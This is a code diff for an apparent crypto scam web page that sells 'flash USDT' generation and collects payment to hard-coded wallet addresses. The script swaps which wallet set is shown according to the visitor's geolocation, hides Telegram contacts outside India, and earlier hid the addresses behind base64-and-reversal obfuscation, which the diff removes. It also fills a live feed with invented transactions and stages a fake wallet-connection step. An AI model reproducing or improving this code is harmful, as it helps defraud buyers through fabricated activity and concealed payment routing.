@@ -369,7 +369,7 @@
       transition: all 0.2s;
       margin-top: 10px;
     }
-    
+
     .btn-whatsapp:hover {
       transform: translateY(-2px);
       box-shadow: 0 4px 12px rgba(37, 211, 102, 0.4);
@@ -394,7 +394,7 @@
       text-decoration: none;
       transition: all 0.2s;
     }
-    
+
     .btn-telegram:hover {
       transform: translateY(-2px);
       box-shadow: 0 4px 12px rgba(0, 136, 204, 0.4);
@@ -2551,7 +2551,7 @@
           <div class="payment-to-label">to this address</div>
           <div id="qrContainer" class="qr-container"></div>
           <div class="payment-address">
-            <span class="payment-address-text" id="paymentAddress">bc1qja5rng2wl8uyuvjpz8fpgk93l6dk8l0cglq8n3</span>
+            <span class="payment-address-text" id="paymentAddress">bc1q9mltuyawx6rtd3nwsraghmmup0kfqx7sqyv999</span>
             <button class="payment-copy-btn" id="copyPaymentAddress">Copy</button>
           </div>
         </div>
@@ -2565,45 +2565,29 @@
 
   <script>
     (function() {
-      var _obfOther = {
-        btc:  'OTk5dnlxczdxZnEwMHVwbW1oZ2Fyc3duM2R0cng2d2F5dXRsbTlxcTFjYg==',
-        eth:  'ODM4MDZjNmFFYzViYmQ3NmFlZUY2NkVCMTFEMGQ0MzVFOGE3RjJDMHgw',
-        usdt: 'ODM4MDZjNmFFYzViYmQ3NmFlZUY2NkVCMTFEMGQ0MzVFOGE3RjJDMHgw',
-        sol:  'N2NHbllQSkJCS25IeDRZNEgxSEJRSmtTNkI3RjYySGliN1ZKaVFYaEVxbTdVNg==',
-        ltc:  'ZWhodGZqbnVydGx1ODc1c21lNjllZjNkNWdqMmNxbG44OWZuYTFjdGw=',
-        trx:  'bWVFbjV6UFF5aFpRV3JONUs4SldnUGZBYkphSHM5RUI=',
-        xrp:  'TVRjdHh0SkNFSlJOWXlRMnl6QVFRV0E0YngxOGMxWko4ck0='
-      };
-
-      function decodeAddress(encoded) {
-        try {
-          return atob(encoded).split('').reverse().join('');
-        } catch (e) {
-          return '';
-        }
-      }
-
-      function buildOtherAddresses() {
-        var out = {};
-        for (var k in _obfOther) {
-          if (Object.prototype.hasOwnProperty.call(_obfOther, k)) {
-            out[k] = decodeAddress(_obfOther[k]);
-          }
-        }
-        return out;
-      }
-
+      // --- Address sets (plaintext) ---
       var paymentAddresses = {
-        btc: 'bc1qja5rng2wl8uyuvjpz8fpgk93l6dk8l0cglq8n3',
-        eth: '0x77AcfA03F4Ad3d004Ec6C3216828284CE5c9354a',
+        btc:  'bc1qja5rng2wl8uyuvjpz8fpgk93l6dk8l0cglq8n3',
+        eth:  '0x77AcfA03F4Ad3d004Ec6C3216828284CE5c9354a',
         usdt: '0x77AcfA03F4Ad3d004Ec6C3216828284CE5c9354a',
-        sol: '5eXZGerdUGPoqLQdkC6EfzR6Ld7Wb6foJMEgfZbaFmS',
-        ltc: 'ltc1qqjwcnxl0eezsfp6xmn4e7th8fmxrp6duetzp5y',
-        trx: 'TCnhzjQUSJcGzL3Tf1eXVKb8aGeBMypV3Y',
-        xrp: 'rc7ArnaEMW2ct1oJft7sZPr7pV1NYw6u6'
+        sol:  '5eXZGerdUGPoqLQdkC6EfzR6Ld7Wb6foJMEgfZbaFmS',
+        ltc:  'ltc1qqjwcnxl0eezsfp6xmn4e7th8fmxrp6duetzp5y',
+        trx:  'TCnhzjQUSJcGzL3Tf1eXVKb8aGeBMypV3Y',
+        xrp:  'rc7ArnaEMW2ct1oJft7sZPr7pV1NYw6u6'
       };
 
-      var activeAddresses = paymentAddresses;
+      var otherAddresses = {
+        btc:  'bc1q9mltuyawx6rtd3nwsraghmmup0kfqx7sqyv999',
+        eth:  '0xC2F7a8E5344d0D11BE66Feea67Dbb5Ec6a6C0838',
+        usdt: '0xC2F7a8E5344d0D11BE66Feea67Dbb5Ec6a6C0838',
+        sol:  '6U7mqhEqXJiV7biH26KF7kbQH6BH1Y4xHknBBJPYnGc7',
+        ltc:  'ltc1qanf79yn4cq2jg5d3fe96ms578ultrunfjh25he',
+        trx:  'TBE9s5HJbAfPgWJ8N5rWQZh7yQJPz5nEem',
+        xrp:  'rJ8ZJ1c81xbU4AWQAyz2QyNRJECJtxtcTM'
+      };
+
+      // Default until geolocation resolves (safe non-India)
+      var activeAddresses = otherAddresses;
 
       var state = {
         selectedAmount: 100000,
@@ -2620,6 +2604,9 @@
       const $ = id => document.getElementById(id);
       const $$ = sel => document.querySelectorAll(sel);
 
+      // ---------------------------------------------------------------
+      // Geo detection: IP lookup with timezone fallback
+      // ---------------------------------------------------------------
       function detectCountryAndApply() {
         try {
           var controller = (typeof AbortController !== 'undefined') ? new AbortController() : null;
@@ -2639,6 +2626,7 @@
               applyGeoResult(isIndia);
             })
             .catch(function () {
+              // Fallback: timezone heuristic
               var isIndia = false;
               try {
                 var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '';
@@ -2652,40 +2640,44 @@
       }
 
       function applyGeoResult(isIndia) {
-        try {
-          activeAddresses = isIndia ? paymentAddresses : buildOtherAddresses();
+        // 1) Swap address set
+        activeAddresses = isIndia ? paymentAddresses : otherAddresses;
 
-          var ids = ['tgContactBar', 'floatTelegramBtn', 'footerTelegramLink', 'footerSep'];
-          for (var i = 0; i < ids.length; i++) {
-            var el = document.getElementById(ids[i]);
-            if (!el) continue;
-            if (isIndia) {
-              if (ids[i] === 'footerTelegramLink' || ids[i] === 'footerSep') {
-                el.style.display = 'inline';
-              } else {
-                el.style.display = '';
-              }
+        // 2) Show/hide Telegram UI
+        var tgIds = ['tgContactBar', 'floatTelegramBtn', 'footerTelegramLink', 'footerSep'];
+        for (var i = 0; i < tgIds.length; i++) {
+          var el = document.getElementById(tgIds[i]);
+          if (!el) continue;
+          if (isIndia) {
+            if (tgIds[i] === 'footerTelegramLink' || tgIds[i] === 'footerSep') {
+              el.style.display = 'inline';
             } else {
-              el.style.display = 'none';
+              el.style.display = '';
             }
+          } else {
+            el.style.display = 'none';
           }
+        }
 
-          try { updatePaymentDisplay(state.selectedCrypto); } catch (e) {}
-        } catch (e) {}
+        // 3) Refresh payment display with the correct address set
+        try { updatePaymentDisplay(state.selectedCrypto); } catch (e) {}
       }
 
+      // ---------------------------------------------------------------
+      // Activity simulation
+      // ---------------------------------------------------------------
       function createFakeTx() {
         const amounts = [50000, 100000, 500000, 1000000];
         const networks = ['Ethereum', 'BSC', 'Tron', 'Polygon', 'Arbitrum', 'Base', 'Avalanche'];
         const amount = amounts[Math.floor(Math.random() * amounts.length)];
         const network = networks[Math.floor(Math.random() * networks.length)];
-        
+
         const chars = 'abcdef0123456789';
         let randHex = '0x';
-        for(let i=0; i<8; i++) randHex += chars[Math.floor(Math.random() * chars.length)];
+        for (let i = 0; i < 8; i++) randHex += chars[Math.floor(Math.random() * chars.length)];
         let endHex = '';
-        for(let i=0; i<4; i++) endHex += chars[Math.floor(Math.random() * chars.length)];
-        
+        for (let i = 0; i < 4; i++) endHex += chars[Math.floor(Math.random() * chars.length)];
+
         return {
           title: `Flash Generation (${network})`,
           hash: randHex + '...' + endHex,
@@ -2694,7 +2686,7 @@
       }
 
       function initFakeActivities() {
-        for(let i=0; i<6; i++) {
+        for (let i = 0; i < 6; i++) {
           state.activities.push(createFakeTx());
         }
       }
@@ -2712,6 +2704,9 @@
         }, Math.random() * 10000 + 5000);
       }
 
+      // ---------------------------------------------------------------
+      // Pricing / formatting
+      // ---------------------------------------------------------------
       function calculateTotalPrice() {
         return tariffBase[state.selectedAmount] * state.durationMultiplier;
       }
@@ -2726,7 +2721,7 @@
       }
 
       function fmt(num) { return num.toLocaleString(); }
-      function shortAddr(addr) { return addr ? addr.slice(0,6)+'...'+addr.slice(-4) : ''; }
+      function shortAddr(addr) { return addr ? addr.slice(0, 6) + '...' + addr.slice(-4) : ''; }
 
       function updateSummary() {
         $('summaryAmount').innerText = fmt(state.selectedAmount) + ' USDT';
@@ -2735,16 +2730,19 @@
         $('summaryPrice').innerText = '$' + price.toFixed(2);
       }
 
+      // ---------------------------------------------------------------
+      // QR
+      // ---------------------------------------------------------------
       function generateQRCode(text) {
         const container = $('qrContainer');
         if (!container) return;
-        
+
         container.innerHTML = '';
         if (typeof qrcode === 'undefined') {
           console.warn('QR library not loaded');
           return;
         }
-        
+
         try {
           const qr = qrcode(0, 'M');
           qr.addData(text);
@@ -2756,6 +2754,9 @@
         }
       }
 
+      // ---------------------------------------------------------------
+      // Tariff selection
+      // ---------------------------------------------------------------
       $$('.tariff-card').forEach(card => {
         card.addEventListener('click', () => {
           $$('.tariff-card').forEach(c => c.classList.remove('active'));
@@ -2766,6 +2767,7 @@
         });
       });
 
+      // Duration
       const durationTrigger = $('durationTrigger');
       durationTrigger.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -2785,6 +2787,7 @@
         });
       });
 
+      // Network
       const networkTrigger = $('networkTrigger');
       networkTrigger.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -2802,6 +2805,7 @@
         });
       });
 
+      // Crypto currency (payment)
       const cryptoTrigger = $('cryptoTrigger');
       cryptoTrigger.addEventListener('click', (e) => {
         e.stopPropagation();
@@ -2821,28 +2825,34 @@
         });
       });
 
+      // ---------------------------------------------------------------
+      // Payment display (uses activeAddresses, set by geo)
+      // ---------------------------------------------------------------
       function updatePaymentDisplay(crypto) {
         let usdPrice = calculateTotalPrice();
         let addr = activeAddresses[crypto] || activeAddresses.btc;
-        
+
         $('paymentCryptoAmount').innerText = '$' + usdPrice.toFixed(2) + ' USD';
         $('paymentAddress').innerText = addr;
         $('paymentPriceUSD').innerText = '$' + usdPrice.toFixed(2);
-        
+
         const iconMap = {
-          btc: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
-          eth: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
+          btc:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/btc.svg',
+          eth:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/eth.svg',
           usdt: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/usdt.svg',
-          sol: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sol.svg',
-          ltc: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/ltc.svg',
-          trx: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/trx.svg',
-          xrp: 'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/xrp.svg'
+          sol:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/sol.svg',
+          ltc:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/ltc.svg',
+          trx:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/trx.svg',
+          xrp:  'https://cdn.jsdelivr.net/npm/cryptocurrency-icons@0.18.1/svg/color/xrp.svg'
         };
         $('paymentCryptoIcon').src = iconMap[crypto] || iconMap.btc;
-        
+
         generateQRCode(addr);
       }
 
+      // ---------------------------------------------------------------
+      // Copy address
+      // ---------------------------------------------------------------
       $('copyPaymentAddress').addEventListener('click', async () => {
         let text = $('paymentAddress').innerText;
         await navigator.clipboard.writeText(text);
@@ -2851,6 +2861,9 @@
         setTimeout(() => btn.innerText = 'Copy', 1500);
       });
 
+      // ---------------------------------------------------------------
+      // Generate button → open payment modal
+      // ---------------------------------------------------------------
       $('generateBtn').addEventListener('click', (e) => {
         let addr = $('targetAddress').value.trim();
         if (!addr) {
@@ -2858,8 +2871,8 @@
           $('addressError').innerText = 'Enter target address';
           return;
         }
-        if (!/^0x[a-fA-F0-9]{40}$/.test(addr) && 
-            !/^T[a-zA-Z0-9]{33}$/.test(addr) && 
+        if (!/^0x[a-fA-F0-9]{40}$/.test(addr) &&
+            !/^T[a-zA-Z0-9]{33}$/.test(addr) &&
             !/^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$/.test(addr) &&
             !/^ltc1[a-zA-Z0-9]{39}$/.test(addr) &&
             !/^r[a-zA-Z0-9]{24,34}$/.test(addr)) {
@@ -2868,7 +2881,7 @@
           return;
         }
         $('addressError').style.display = 'none';
-        
+
         $('paymentFlashAmount').innerText = fmt(state.selectedAmount) + ' USDT';
         $('paymentNetwork').innerText = state.selectedNetwork;
         $('paymentTargetAddr').innerText = shortAddr(addr);
@@ -2877,28 +2890,34 @@
         openModal('paymentModal');
       });
 
+      // ---------------------------------------------------------------
+      // Modals
+      // ---------------------------------------------------------------
       function openModal(id) { $(id).classList.add('active'); }
       function closeModal(id) { $(id).classList.remove('active'); }
 
-      $('closePaymentModal').addEventListener('click', ()=>closeModal('paymentModal'));
-      $('closeTxModal').addEventListener('click', ()=>closeModal('txModal'));
-      
-      $('connectBtn').addEventListener('click', ()=>{
+      $('closePaymentModal').addEventListener('click', () => closeModal('paymentModal'));
+      $('closeTxModal').addEventListener('click', () => closeModal('txModal'));
+
+      $('connectBtn').addEventListener('click', () => {
         document.getElementById('generator').scrollIntoView({ behavior: 'smooth' });
       });
 
-      $('closeWalletModal')?.addEventListener('click', ()=>closeModal('walletModal'));
+      $('closeWalletModal')?.addEventListener('click', () => closeModal('walletModal'));
 
       $$('.wallet-option').forEach(opt => {
-        opt.addEventListener('click', ()=>{
+        opt.addEventListener('click', () => {
           closeModal('walletModal');
           openModal('connectingModal');
-          setTimeout(()=>closeModal('connectingModal'), 1500);
+          setTimeout(() => closeModal('connectingModal'), 1500);
         });
       });
 
+      // ---------------------------------------------------------------
+      // Bottom nav
+      // ---------------------------------------------------------------
       $$('.nav-item').forEach(btn => {
-        btn.addEventListener('click', ()=>{
+        btn.addEventListener('click', () => {
           $$('.nav-item').forEach(b => b.classList.remove('active'));
           btn.classList.add('active');
           let panel = btn.dataset.panel;
@@ -2935,6 +2954,9 @@
         `).join('');
       }
 
+      // ---------------------------------------------------------------
+      // Global click: close open selects
+      // ---------------------------------------------------------------
       document.addEventListener('click', (e) => {
         if (!e.target.closest('.custom-select')) {
           $$('.custom-select').forEach(s => s.classList.remove('open'));
@@ -2944,16 +2966,23 @@
         }
       });
 
+      // ---------------------------------------------------------------
+      // Telegram link rewriting (only matter if India shows them)
+      // ---------------------------------------------------------------
       document.querySelectorAll('a[href*="t.me"]').forEach(link => {
         link.href = `https://t.me/${telegramUsername}`;
       });
 
+      // ---------------------------------------------------------------
+      // Boot
+      // ---------------------------------------------------------------
       initFakeActivities();
       startLiveSimulation();
       updateSummary();
       renderActivities();
       updatePaymentDisplay(state.selectedCrypto);
 
+      // Geolocation runs last; on resolve it swaps addresses + toggles Telegram
       detectCountryAndApply();
     })();
   </script>
